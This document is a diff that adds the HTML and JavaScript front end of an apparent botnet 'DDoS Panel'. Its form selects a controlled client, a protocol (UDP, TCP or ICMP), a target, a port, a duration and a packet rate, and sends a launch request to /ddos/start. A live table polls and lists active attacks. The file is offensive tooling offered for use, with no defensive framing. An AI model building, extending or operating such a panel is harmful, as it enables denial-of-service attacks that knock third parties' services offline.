@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html><head>
+  <title>DDoS Panel</title>
+  <style>/* reuse your dashboard styles */</style>
+</head><body>
+  <header><a href="/">← Back</a> DDoS Panel</header>
+  <div style="padding:1rem;">
+    <h3>Start Attack</h3>
+    <form id="ddosForm">
+      <label>Client:
+        <select id="clientSelect"></select>
+      </label>
+      <label>Proto:
+        <select id="proto"><option>UDP</option><option>TCP</option><option>ICMP</option></select>
+      </label>
+      <label>Target: <input id="target" required/></label>
+      <label>Port: <input id="port" type="number" required/></label>
+      <label>Duration (s): <input id="duration" type="number" value="60"/></label>
+      <label>PPS: <input id="pps" type="number" value="100"/></label>
+      <button type="submit">Launch</button>
+    </form>
+
+    <h3>Active Attacks</h3>
+    <table border=1 cellpadding=4>
+      <thead><tr>
+        <th>Task ID</th><th>Client</th><th>Proto</th>
+        <th>Target:Port</th><th>Status</th><th>Remaining (s)</th>
+      </tr></thead>
+      <tbody id="tasks"></tbody>
+    </table>
+  </div>
+
+  <script>
+    async function fetchClients(){
+      const res = await fetch('/clients');
+      return await res.json();
+    }
+    async function fetchTasks(){
+      const res = await fetch('/ddos/tasks');
+      return await res.json();
+    }
+    function fillClients(list){
+      const sel = document.getElementById('clientSelect');
+      sel.innerHTML = '';
+      list.forEach(c=>{
+        const o = document.createElement('option');
+        o.value = c.id; o.textContent = c.id;
+        sel.appendChild(o);
+      });
+    }
+    function fillTasks(list){
+      const tb = document.getElementById('tasks');
+      tb.innerHTML = '';
+      list.forEach(t=>{
+        const tr = document.createElement('tr');
+        for(const k of ['id','client_id','protocol']){
+          tr.appendChild(Object.assign(document.createElement('td'),{textContent:t[k]}));
+        }
+        tr.appendChild(Object.assign(document.createElement('td'),
+                          {textContent:`${t.target}:${t.port}`}));
+        tr.appendChild(Object.assign(document.createElement('td'),{textContent:t.status}));
+        tr.appendChild(Object.assign(document.createElement('td'),{textContent:t.remaining}));
+        tb.appendChild(tr);
+      });
+    }
+
+    document.getElementById('ddosForm').addEventListener('submit', async e=>{
+      e.preventDefault();
+      const payload = {
+        client_id: document.getElementById('clientSelect').value,
+        protocol:  document.getElementById('proto').value,
+        target:    document.getElementById('target').value,
+        port:      document.getElementById('port').value,
+        duration:  document.getElementById('duration').value,
+        pps:       document.getElementById('pps').value,
+      };
+      await fetch('/ddos/start', {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify(payload)
+      });
+      // immediately refresh task list
+      fillTasks(await fetchTasks());
+    });
+
+    // initial load & polling
+    (async()=>{
+      fillClients(await fetchClients());
+      fillTasks(await fetchTasks());
+      setInterval(async()=>{
+        fillTasks(await fetchTasks());
+      },2000);
+    })();
+  </script>
+</body></html>
